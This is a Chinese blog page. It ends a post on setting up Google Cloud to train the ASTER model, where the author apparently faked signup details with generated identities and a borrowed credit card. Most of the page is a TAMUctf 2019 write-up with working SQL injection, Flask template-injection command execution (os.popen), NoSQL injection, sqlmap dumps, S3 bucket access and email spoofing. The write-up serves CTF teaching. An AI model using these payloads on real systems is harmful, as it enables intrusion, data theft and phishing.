truth\nTest Set Test Set Images (43.3MB).- 500 images obtained with wearable cameras. You can submit your results for this Task over the images of the test set through the My Methods section.\nTest Set Vocabulary (8KB).- Vocabulary of all words (words of 3 characters or longer comprising only letters) appearing in the test set\nTest Set Per-image Vocabularies (248KB).- Vocabularies of 100 words per image, comprising the words appearing in the image plus distractors\nTest Set Ground Truth (244 Kb). - 500 text files with text localisation bounding boxes for the images of the test set.\nOther Generic Vocabulary (796 KB).- A vocabulary of about 90 k words derived from the dataset publicly available here. Please consult [1,2] for further information as well as the disclaimer in the vocabulary file itself.\niiit5k 主页 下载：IIIT5K-Word_V3.0.tar.gz (106 MB) svt 主页 下载：Street View Text (118MB) synth90k 主页 下载：mjsynth.tar.gz ( 10 GB )，解压后约34 G，生成的 tfrecord 约16 G。 synthtext 主页 下载：SynthText.zip 约40G 数据集处理 在 ~/tf/data 目录下存放数据集文件夹，配置 ~/tf/aster/tools/creat_*.py 中的输入输出目录，运行脚本可在数据集同目录下得到tfrecord文件。\n训练 在~/tf/data/目录下存放tfrecord文件；\n在~/tf/aster/experiments/ 新建train1 文件夹，再在其中新建config 和 log 文件夹；\n在config 文件夹内新建trainval.prototxt ，内容参照~/tf/aster/experiments/demo/config/trainval.prototxt 。\n执行训练命令后在~/tf/aster/experiments/train1/log 目录下生成checkpoint文件等。\ntrain :\n1 2 cd ~/tf/ python aster/train.py --exp_dir=aster/experiments/train1/ --num_clones=2 eval :\n1 2 cd ~/tf/ python aster/eval.py --exp_dir=aster/experiments/train1/ 其他 提高访问速度 如果是位于国内的服务器，可更改部分操作以提高访问速度。\n修改Ubuntu更新源 编辑Ubuntu16.04的 /etc/apt/source.list 为以下内容。\n1 2 3 4 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse 使用ssh sudo apt update \u0026amp;\u0026amp; sudo apt install openssh-server \u0026amp;\u0026amp; sudo service ssh start\nsudo apt install lrzsz 安装 lrzsz 后用sz / rz 命令进行小文件传输，大文件用sftp。\n下载Anaconda wget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-4.2.0-Linux-x86_64.sh 修改Anaconda软件源 1 2 3 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --set show_channel_urls yes 修改pip源 mkdir -p ~/.pip \u0026amp;\u0026amp; touch ~/.pip/pip.conf\n修改 ~/.pip/pip.conf 内容为\n1 2 3 4 [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=mirrors.aliyun.com （Windows下为 C:\\Users\\USERNAME\\AppData\\Roaming\\pip\\pip.ini ）\n克隆GitHub公开repo到私有 GitHub前段时间已经支持免费使用私有仓库，可以将代码仓库镜像自己的私有仓库，更方便地记录代码更改。\nsudo apt install git\n设置git配置和远程访问\n1 2 3 git config --global user.name findneo git config --global user.email username@gmail.com ssh-keygen -t rsa -b 4096 -C \u0026#34;usernameo@gmail.com\u0026#34; 将~/.ssh/id_rsa.pub添加到GitHub的SSH keys。\nssh -T git@github.com 测试是否成功\nmirror 公开仓库 bgshih/aster 到 私有仓库 findneo/myaster\n在GitHub新建名为myaster的私有仓库\n1 2 3 4 5 6 git clone --bare https://github.com/bgshih/aster.git cd aster.git git push -mirror https://github.com/findneo/myaster.git cd .. rm -rf aster.git git clone git@github.com:findneo/myaster.git protocol buffers 和XML/JSON/Thrift类似，优点在于简单，快，小，后向兼容，语言平台应用无关；缺点在于自解释性不够，不能表示很复杂的结构。\n只要描述proto文件，就可以使用编译器protoc(支持c++/Java/Python)自动生成用于序列化、反序列化、读写对象的操作的代码。\n感谢 最后，感谢慷慨借用信用卡的朋友。\n参考链接 学姿势 - 校园金融第一站 ——学习信用卡相关的姿势 美国人信息生成，美国身份生成-世界各国身份信息、地址、信用卡生成 CUDA 下载 cuDNN下载 NVIDIA显卡驱动下载 保姆级教程——Ubuntu16.04 Server下深度学习环境搭建：安装CUDA8.0，cuDNN6.0，Bazel0.5.4，源码编译安装TensorFlow1.4.0(GPU版) 深度学习环境搭建：Tensorflow1.4.0+Ubuntu16.04+Python3.5+Cuda8.0+Cudnn6.0 论文下载：【PAMI2018】ASTER_An Attentional Scene Text Recognizer with Flexible Rectification.pdf 代码仓库：https://github.com/bgshih/aster 清华大学开源软件镜像站 国内Anaconda下载 国际Anaconda下载 Duplicating a repository Google Protocol Buffer 的使用和原理 ","permalink":"https://ret2neo.cn/post/190308-run-aster-on-gce-or-locally/","summary":"深度学习需要较强的计算能力，在网络上找了一圈，列出一些可用的方案。\n极客云 谷歌云 。提供一年免费试用，但需要外币信用卡。 谷歌的Colaboratory 厦大HPC 淘宝西电机房等 百度深度学习平台 AWS DeepBrain Chain 美团云 售罄 滴滴云 华为云 阿里云 参考文章 机器学习深度学习云GPU资源与对比 有没有云端的深度学习计算服务？ 基本环境 在谷歌云上搭建起 Ubuntu16.04 + Python3.5 + tensorflow-gpu-1.4 + CUDA v8 + cuDNN v6 的环境。\n申请试用谷歌云 地址可随意填，记录两个。\n台中市大甲区大甲里 邮编：43749\nCalifornia(加利福尼亚省) Adelanto(阿德兰托市) 邮编[ADELANTO CA 92301]\n新建虚拟机 进入Google Cloud Platform -\u0026gt; Compute Engine -\u0026gt; VM 实例 ，通过“创建实例”新建一台虚拟机。\n机器类型中选择自定义来添加GPU数量和类型。 需要先按提示申请升级账户才能进行上述操作。很快会有邮件反馈申请成功。 自定义磁盘容量，防火墙允许流量。 点击创建得到一台全新的云端虚拟机。 远程访问 添加静态外部IP地址。在VM实例页面，实例右侧的设置处点击查看网络详情即可。 在Compute Engine -\u0026gt; 元数据 中修改SSH 密钥。使用XHSELL或命令行工具生成密钥对后在云端按指定格式添加公钥，然后可在本地用私钥远程登陆。 安装Anaconda wget https://repo.continuum.io/archive/Anaconda3-4.2.0-Linux-x86_64.sh\nchmod +x Anaconda3-4.","title":"使用谷歌云进行深度学习训练，以aster为例"},{"content":"Web Not Another SQLi Challenge 尝试登陆时页面会发生跳转，可在chrome浏览器开发者工具中的Network栏勾选Preserve log保存报文内容，以便用于burp重放。\n万能密码登录。\n1 2 $curl -s \u0026#34;http://web1.tamuctf.com/web/login.php\u0026#34; -d \u0026#34;username=admin\u0026#39; or 1=1#\u0026amp;password\u0026#34; | grep -o \u0026#34;gigem{.*}\u0026#34; gigem{f4rm3r5_f4rm3r5_w3\u0026#39;r3_4ll_r16h7} Robots Rule 1 2 3 4 5 6 $curl \u0026#34;http://web5.tamuctf.com/robots.txt\u0026#34; User-agent: * WHAT IS UP, MY FELLOW HUMAN! HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?! YOU CAN TELL ME, A FELLOW NOT-A-ROBOT! 按提示伪装成Google机器人访问 robots.txt 。\n1 2 curl \u0026#34;http://web5.tamuctf.com/robots.txt\u0026#34; -A \u0026#34;Googlebot/2.1 (+http://www.google.com/bot.html)\u0026#34; -s | grep -o \u0026#34;gigem{.*}\u0026#34; gigem{be3p-bOop_rob0tz_4-lyfe} Many Gig\u0026rsquo;ems to you! http://web7.tamuctf.com\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ curl -s http://web7.tamuctf.com/index.html | grep -oE \u0026#39;gigem{[^\u0026#34;]+\u0026#34;\u0026#39; gigem{flag_in_\u0026#34; $ curl -s http://web7.tamuctf.com/cookies.html | grep -oE \u0026#39;gigem{[^\u0026#34;]+\u0026#34;\u0026#39; gigem{continued == source_and_\u0026#34; gigem{_continued=source_and_\u0026#34; gigem{_continued=source_and_\u0026#34; $ curl http://web7.tamuctf.com/cook.js document.cookie = \u0026#34;gigem_continue=cookies}; expires=Thu, 18 Dec 2020 12:00:00 UTC\u0026#34;; document.cookie = \u0026#34;hax0r=flagflagflagflagflagflag; expires=Thu, 18 Dec 2020 12:00:00 UTC\u0026#34;; document.cookie = \u0026#34;gigs=all_the_cookies; expires=Thu, 18 Dec 2020 12:00:00 UTC\u0026#34;; document.cookie = \u0026#34;cookie=flagcookiegigemflagcookie; expires=Thu, 18 Dec 2020 12:00:00 UTC\u0026#34;; 几个页面相关的内容连起来得到flag为gigem{flag_in_source_and_cookies 。这个题目意思不大。\nScience! http://web3.tamuctf.com\nDifficulty: medium\nflask的SSTI。\n命令执行\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(\u0026#39;ls -Rhl\u0026#39;).read()}} 文件读取\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[40](\u0026#39;flag.txt\u0026#39;).read()}} gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}\nviews.py内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import json import sys from tamuctf import app from flask import Flask, render_template, request, jsonify, render_template_string @app.route(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/index\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/science\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def science(): try: chem1 = request.form[\u0026#39;chem1\u0026#39;] chem2 = request.form[\u0026#39;chem2\u0026#39;] template = \u0026#39;\u0026#39;\u0026#39;\u0026lt;html\u0026gt; \u0026lt;div style=\u0026#34;text-align:center\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;The result of combining {} and {} is:\u0026lt;/h3\u0026gt;\u0026lt;/br\u0026gt; \u0026lt;iframe src=\u0026#34;https://giphy.com/embed/AQ2tIhLp4cBa\u0026#34; width=\u0026#34;468\u0026#34; height=\u0026#34;480\u0026#34; frameBorder=\u0026#34;0\u0026#34; class=\u0026#34;giphy-embed\u0026#34; allowFullScreen\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/html\u0026gt;\u0026#39;\u0026#39;\u0026#39;.format(chem1, chem2) return render_template_string(template, dir=dir, help=help, locals=locals) except: return \u0026#34;Something went wrong\u0026#34; 参考文章：\n[Flask/Jiaja2 SSTI](Flask/Jiaja2 SSTI) Flask/Jinja2 SSTI \u0026amp;\u0026amp; python 沙箱逃逸 Buckets Checkout my s3 bucket website! http://tamuctf.s3-website-us-west-2.amazonaws.com/\nDifficulty: easy\n亚马逊云存储器S3 BUCKET未授权访问。\n从链接知bucket name为tamuctf ，访问http://tamuctf.s3.amazonaws.com/ ，\n在页面中搜索发现Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt ，\n访问http://tamuctf.s3.amazonaws.com/Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt ，\n得到flag为flag{W0W_S3_BAD_PERMISSIONS} 。\n参考文章：\n针对亚马逊云存储器S3 BUCKET的渗透测试 【技术分享】AWS渗透测试（Part 1）：S3 Buckets 配置 AWS CLI Login App http://web4.tamuctf.com\nDifficulty: medium\n页面源码有一段JavaScript\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;script\u0026gt; $(\u0026#34;#submit\u0026#34;).on(\u0026#39;click\u0026#39;, function(){ $.ajax({ url: \u0026#39;login\u0026#39;, type : \u0026#34;POST\u0026#34;, dataType : \u0026#39;json\u0026#39;, data : JSON.stringify({\u0026#34;username\u0026#34;: $(\u0026#34;#username\u0026#34;).val(), \u0026#34;password\u0026#34;: $(\u0026#34;#password\u0026#34;).val()}), contentType: \u0026#39;application/json;charset=UTF-8\u0026#39;, success : function(result) { $(\u0026#34;.result\u0026#34;).html(result); console.log(result); alert(result); }, error: function(xhr, resp, text) { $(\u0026#34;.result\u0026#34;).html(\u0026#34;Something went wrong\u0026#34;); console.log(xhr, resp, text); } }) }); \u0026lt;/script\u0026gt; NoSQL注入。\n报文：\n1 2 3 4 5 6 7 8 9 POST /login HTTP/1.1 Host: web4.tamuctf.com Content-Length: 50 Accept: text/plain Content-Type: application/json;charset=UTF-8 Referer: http://web4.tamuctf.com/admin Connection: close {\u0026#34;username\u0026#34;:{\u0026#34;$eq\u0026#34;:\u0026#34;admin\u0026#34;},\u0026#34;password\u0026#34;:{\u0026#34;$gt\u0026#34;:\u0026#34;\u0026#34;}} 或\n或\n1 2 3 4 5 curl -H \u0026#39;Content-Type: application/json; charset=UTF-8\u0026#39; -X POST --data \u0026#39;{\u0026#34;username\u0026#34;:{\u0026#34;$ne\u0026#34;:\u0026#34;nosql\u0026#34;},\u0026#34;password\u0026#34;:{\u0026#34;$ne\u0026#34;:\u0026#34;injection\u0026#34;}}\u0026#39; http://web4.tamuctf.com/login \u0026#34;Welcome: bob!\u0026#34; curl -H \u0026#39;Content-Type: application/json; charset=UTF-8\u0026#39; -X POST --data \u0026#39;{\u0026#34;username\u0026#34;:{\u0026#34;$ne\u0026#34;:\u0026#34;bob\u0026#34;},\u0026#34;password\u0026#34;:{\u0026#34;$ne\u0026#34;:\u0026#34;injection\u0026#34;}}\u0026#39; http://web4.tamuctf.com/login \u0026#34;Welcome: admin!\\ngigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}\u0026#34; 参考文章：\n一个有趣的实例让NoSQL注入不再神秘\nBird Box Challenge http://web2.tamuctf.com\nWe\u0026rsquo;ve got Aggies, Trucks, and Eggs!\nDifficulty: hard\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 neo@o:~$ curl -sG --data-urlencode \u0026#34;Search=test\u0026#34; http://web2.tamuctf.com/Search.php | grep -o \u0026#34;\u0026lt;h1\u0026gt;.*\u0026lt;/h1\u0026gt;\u0026#34; \u0026lt;h1\u0026gt;Our search isn\u0026#39;t THAT good...\u0026lt;/h1\u0026gt; neo@o:~$ curl -sG --data-urlencode \u0026#34;Search=test\u0026#39; or 1=1#\u0026#34; http://web2.tamuctf.com/Search.php | grep -o \u0026#34;\u0026lt;h1\u0026gt;.*\u0026lt;/h1\u0026gt;\u0026#34; \u0026lt;h1\u0026gt;Nice try, nothing to see here.\u0026lt;/h1\u0026gt; neo@o:~$ curl -sG --data-urlencode \u0026#34;Search=test\u0026#39; and 1=0 union select 123 #\u0026#34; http://web2.tamuctf.com/Search.php | grep -o \u0026#34;\u0026lt;h1\u0026gt;.*\u0026lt;/h1\u0026gt;\u0026#34; \u0026lt;h1\u0026gt;Nope. Not gonna let you use that command.\u0026lt;/h1\u0026gt; neo@o:~$ curl -sG --data-urlencode \u0026#34;Search=test\u0026#39; and 1=0 union 123 #\u0026#34; http://web2.tamuctf.com/Search.php | grep -o \u0026#34;\u0026lt;h1\u0026gt;.*\u0026lt;/h1\u0026gt;\u0026#34; \u0026lt;h1\u0026gt;Nope. Not gonna let you use that command.\u0026lt;/h1\u0026gt; neo@o:~$ curl -sG --data-urlencode \u0026#34;Search=test\u0026#39; and 1=0 select 123 #\u0026#34; http://web2.tamuctf.com/Search.php | grep -o \u0026#34;\u0026lt;h1\u0026gt;.*\u0026lt;/h1\u0026gt;\u0026#34; \u0026lt;h1\u0026gt; Our search isn\u0026#39;t THAT good... \u0026lt;/h1\u0026gt; neo@o:~$ curl -sG --data-urlencode \u0026#34;Search=test\u0026#39;union select 123#\u0026#34; http://web2.tamuctf.com/Search.php | grep -o \u0026#34;\u0026lt;h1\u0026gt;.*\u0026lt;/h1\u0026gt;\u0026#34; \u0026lt;h1\u0026gt;123\u0026lt;/h1\u0026gt; neo@o:~$ curl -sG --data-urlencode \u0026#34;Search=test\u0026#39;union select version()#\u0026#34; http://web2.tamuctf.com/Search.php | grep -o \u0026#34;\u0026lt;h1\u0026gt;.*\u0026lt;/h1\u0026gt;\u0026#34; \u0026lt;h1\u0026gt;5.7.25-0ubuntu0.18.04.2\u0026lt;/h1\u0026gt; 注入一把梭。\n1 2 3 4 5 6 7 8 9 10 11 \u0026#39;UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema != \u0026#39;information_schema\u0026#39; # 得到数据库名：SqliDB \u0026#39;UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema != \u0026#39;information_schema\u0026#39; # 得到表名：Search \u0026#39;UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema != \u0026#39;information_schema\u0026#39; # 得到列名：items \u0026#39;UNION ALL SELECT GROUP_CONCAT(items) FROM Search # 得到记录：Eggs,Trucks,Aggies 翻一圈啥也没有，flag不在数据库中，尝试用户名。\n1 2 neo@o:~$ curl -sG --data-urlencode \u0026#34;Search=test\u0026#39;union select current_user#\u0026#34; http://web2.tamuctf.com/Search.php | grep -o \u0026#34;\u0026lt;h1\u0026gt;.*\u0026lt;/h1\u0026gt;\u0026#34; \u0026lt;h1\u0026gt;gigem{w3_4r3_th3_4ggi3s}@localhost\u0026lt;/h1\u0026gt; 实际上也可以直接上sqlmap。\n1 sqlmap -u \u0026#34;http://web2.tamuctf.com/Search.php?Search=eggs\u0026#34; -p Search --dbms mysql --random-agent --sql-shell --hex --threads 10 --proxy=http://127.0.0.1:1080 1337 Secur1ty http://web6.tamuctf.com\nDifficulty: hard\n注册用户后进入。\n二维码解码结果为otpauth://totp/TAMU_CTF?secret=5UGMBIONB66MCOXH 。\n消息是可以点击查看详情的。\n对该链接http://web6.tamuctf.com/message?id=2 测试注入。\n1 python sqlmap.py -u \u0026#34;http://web6.tamuctf.com/message?id=2\u0026#34; -p id --threads 10 --dump-all --random-agent --hex 得到admin用户邮箱为 1337-admin@l337secur1ty.hak ，Secret值为WIFHXDZ3BOHJMJSC，id为1，密码哈希为02ca0b0603222a090fe2fbf3ba97d90c ，在somd5查询对应明文为secretpasscode 。\n使用burp修改cookie后转发可见flag为gigem{th3_T0tp_1s_we4k_w1tH_yoU}。\nReversing Cheesy 1 2 echo Z2lnZW17M2E1eV9SM3YzcjUxTjYhfQ== | base64 -d gigem{3a5y_R3v3r51N6!} Snakes over cheese 使用pyc在线反编译 得到如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # uncompyle6 version 3.2.5 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.5 (default, Oct 30 2018, 23:45:53) # [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)] # Embedded file name: reversing2.py # Compiled at: 2018-10-08 03:28:58 from datetime import datetime Fqaa = [102, 108, 97, 103, 123, 100, 101, 99, 111, 109, 112, 105, 108, 101, 125] XidT = [83, 117, 112, 101, 114, 83, 101, 99, 114, 101, 116, 75, 101, 121] def main(): print \u0026#39;Clock.exe\u0026#39; input = raw_input(\u0026#39;\u0026gt;: \u0026#39;).strip() kUIl = \u0026#39;\u0026#39; for i in XidT: kUIl += chr(i) if input == kUIl: alYe = \u0026#39;\u0026#39; for i in Fqaa: alYe += chr(i) print alYe else: print datetime.now() if __name__ == \u0026#39;__main__\u0026#39;: main() 则Fqaa转换后为 flag{decompile} 。\n042 Cheers for actual assembly!\n#medium\nreversing3.s\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 .section\t__TEXT,__text,regular,pure_instructions .build_version macos, 10, 14 .globl\t_concat ## -- Begin function concat .p2align\t4, 0x90 _concat: ## @concat .cfi_startproc ## %bb.0: pushq\t%rbp .cfi_def_cfa_offset 16 .cfi_offset %rbp, -16 movq\t%rsp, %rbp .cfi_def_cfa_register %rbp subq\t$48, %rsp movq\t%rdi, -8(%rbp) movq\t%rsi, -16(%rbp) movq\t-8(%rbp), %rdi callq\t_strlen movq\t-16(%rbp), %rdi movq\t%rax, -32(%rbp) ## 8-byte Spill callq\t_strlen movq\t-32(%rbp), %rsi ## 8-byte Reload addq\t%rax, %rsi addq\t$1, %rsi movq\t%rsi, %rdi callq\t_malloc movq\t$-1, %rdx movq\t%rax, -24(%rbp) movq\t-24(%rbp), %rdi movq\t-8(%rbp), %rsi callq\t___strcpy_chk movq\t$-1, %rdx movq\t-24(%rbp), %rdi movq\t-16(%rbp), %rsi movq\t%rax, -40(%rbp) ## 8-byte Spill callq\t___strcpy_chk movq\t-24(%rbp), %rdx movq\t%rax, -48(%rbp) ## 8-byte Spill movq\t%rdx, %rax addq\t$48, %rsp popq\t%rbp retq .cfi_endproc ## -- End function .globl\t_main ## -- Begin function main .p2align\t4, 0x90 _main: ## @main .cfi_startproc ## %bb.0: pushq\t%rbp .cfi_def_cfa_offset 16 .cfi_offset %rbp, -16 movq\t%rsp, %rbp .cfi_def_cfa_register %rbp subq\t$80, %rsp leaq\tL_.str(%rip), %rdi movl\t$3, %eax movl\t$14, %ecx xorl\t%esi, %esi movl\t$8, %edx ## kill: def %rdx killed %edx leaq\t-16(%rbp), %r8 movq\t___stack_chk_guard@GOTPCREL(%rip), %r9 movq\t(%r9), %r9 movq\t%r9, -8(%rbp) movl\t$0, -20(%rbp) movq\t%rdi, -56(%rbp) ## 8-byte Spill movq\t%r8, %rdi movl\t%ecx, -60(%rbp) ## 4-byte Spill movl\t%eax, -64(%rbp) ## 4-byte Spill callq\t_memset movb\t$65, -16(%rbp) movb\t$53, -15(%rbp) movb\t$53, -14(%rbp) movb\t$51, -13(%rbp) movb\t$77, -12(%rbp) movb\t$98, -11(%rbp) movb\t$49, -10(%rbp) movb\t$89, -9(%rbp) movl\t$0, -28(%rbp) movl\t$1, -32(%rbp) movl\t$2, -36(%rbp) movl\t-36(%rbp), %eax imull\t-36(%rbp), %eax imull\t-36(%rbp), %eax movl\t-28(%rbp), %ecx addl\t-32(%rbp), %ecx addl\t-32(%rbp), %ecx addl\t-32(%rbp), %ecx imull\t%ecx, %eax cltd movl\t-60(%rbp), %ecx ## 4-byte Reload idivl\t%ecx movl\t%eax, -40(%rbp) movl\t-36(%rbp), %eax imull\t-36(%rbp), %eax imull\t-36(%rbp), %eax movl\t-28(%rbp), %esi addl\t-32(%rbp), %esi addl\t-32(%rbp), %esi imull\t%esi, %eax cltd movl\t-64(%rbp), %esi ## 4-byte Reload idivl\t%esi movl\t%eax, -44(%rbp) movl\t-40(%rbp), %esi movq\t-56(%rbp), %rdi ## 8-byte Reload movb\t$0, %al callq\t_printf leaq\tL_.str.1(%rip), %rdi movl\t-44(%rbp), %esi movl\t%eax, -68(%rbp) ## 4-byte Spill movb\t$0, %al callq\t_printf leaq\tL_.str.2(%rip), %rdi leaq\t-16(%rbp), %rsi movl\t%eax, -72(%rbp) ## 4-byte Spill movb\t$0, %al callq\t_printf movq\t___stack_chk_guard@GOTPCREL(%rip), %rsi movq\t(%rsi), %rsi movq\t-8(%rbp), %rdi cmpq\t%rdi, %rsi movl\t%eax, -76(%rbp) ## 4-byte Spill jne\tLBB1_2 ## %bb.1: xorl\t%eax, %eax addq\t$80, %rsp popq\t%rbp retq LBB1_2: callq\t___stack_chk_fail ud2 .cfi_endproc ## -- End function .section\t__TEXT,__cstring,cstring_literals L_.str: ## @.str .asciz\t\u0026#34;The answer: %d\\n\u0026#34; L_.str.1: ## @.str.1 .asciz\t\u0026#34;Maybe it\u0026#39;s this:%d\\n\u0026#34; L_.str.2: ## @.str.2 .asciz\t\u0026#34;gigem{%s}\\n\u0026#34; .subsections_via_symbols 注意到71-78行。\n1 2 print \u0026#34;gigem{%s}\u0026#34;%\u0026#34;\u0026#34;.join(chr(i) for i in [65,53,53,51,77,98,49,89]) # gigem{A553Mb1Y} Misc Who am I? What is the A record for tamuctf.com? (Not in standard gigem{flag} format)\ntamuctf.com 的域名A记录为52.33.57.247 ，提交即可。可使用这个网站 或者命令nslookup -type=all tamuctf.com 。\nWho do I trust? Who issued the certificate to tamuctf.com? (Not in standard gigem{flag} format)\n查看证书知颁发机构为 Let's Encrypt Authority X3 。\nWhere am I? What is the name of the city where the server for tamuctf.com is located?\n(Not in standard gigem{flag} format)\n使用在线网站 查询得到服务器所在城市为 Boardman 。\nI heard you like files. 1 2 3 $binwalk -e art.png $tail -n1 _art.png.extracted/word/media/image1.png | base64 -d flag{P0lYt@r_D0_y0u_G3t_It_N0w?} Hello World 在页面全选可发现端倪。\n这是一种由空白字符（空白符、制表符、换行符）组成的编程语言。这是一个 在线解释器 。\nflag is gigem{0h_my_wh4t_sp4c1ng_y0u_h4v3} 。\nOnboarding Checklist From: importantperson@somebigcorp.com Date: Feb 22, 2019 9:00 AM To: someguy@somebigcorp.com Subject: New Employee Access\nHello Some Guy,\nWe need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee\u0026rsquo;s email address to tamuctf@gmail.com so they can process the account request?\nThank you, Important Person\nThe new employee can be a little slow to respond.\nDifficulty: easy\n2/26 8:42 am CST: Visting somebigcorp.com is not part of the challenge\n按照指示发送钓鱼邮件，接收到flag为gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55} 。\n工具：伪造邮件，临时邮箱 。\nCrypto -.- To 1337-H4X0R:\nOur coworker Bob loves a good classical cipher. Unfortunately, he also loves to send everything encrypted with these ciphers. Can you go ahead and decrypt this for me?\nDifficulty: easy\nflag.txt\n1 dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit 